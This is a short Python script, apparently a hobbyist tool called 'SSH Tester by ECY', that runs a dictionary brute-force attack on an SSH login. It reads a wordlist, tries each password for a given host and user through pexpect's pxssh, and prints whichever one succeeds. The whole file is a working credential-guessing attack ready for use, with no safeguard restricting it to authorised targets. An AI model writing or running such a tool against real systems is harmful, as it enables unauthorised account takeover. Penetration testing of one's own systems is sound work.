from pexpect import pxssh
import argparse

# example -->> python3 ssh_brute_ecy.py 192.168.1.1 admin password.txt

def ssh_connect(host, user, password):
    try:
        s = pxssh.pxssh(timeout=5)
        s.login(host, user, password)
        prompt = s.PROMPT
        s.sendline('echo $?')  
        s.prompt()
        exit_code = s.before.decode().strip().splitlines()[-1]  
        if exit_code == '0':
            print('[+] Password Found: {}'.format(password))
            return True
        else:
            return False
    except Exception as e:
        print('[-] Exception:', e)
        return False
    finally:
        s.close()

def main():
    parser = argparse.ArgumentParser('SSH Tester by ECY')
    parser.add_argument('host', type=str, help='Host IP address for the SSH server')
    parser.add_argument('user', type=str, help='Username for the SSH connection')
    parser.add_argument('passwordFile', type=str, help='Password file to be used as the dictionary')
    args = parser.parse_args()
    host = args.host
    user = args.user
    passwordFile = args.passwordFile

    print('\n[+] Welcome to SSH Tester by ***_ECY_*** \n')

    try:
        with open(passwordFile, 'r') as f:
            passwords = f.readlines()
    except Exception as e:
        print(e)
        exit(1)

    for password in passwords:
        password = password.strip()
        print('[-] Testing Password: {}'.format(password))
        if ssh_connect(host, user, password):
            break

    print('\n[+] Finished testing passwords\n')

if __name__ == '__main__':
    main()
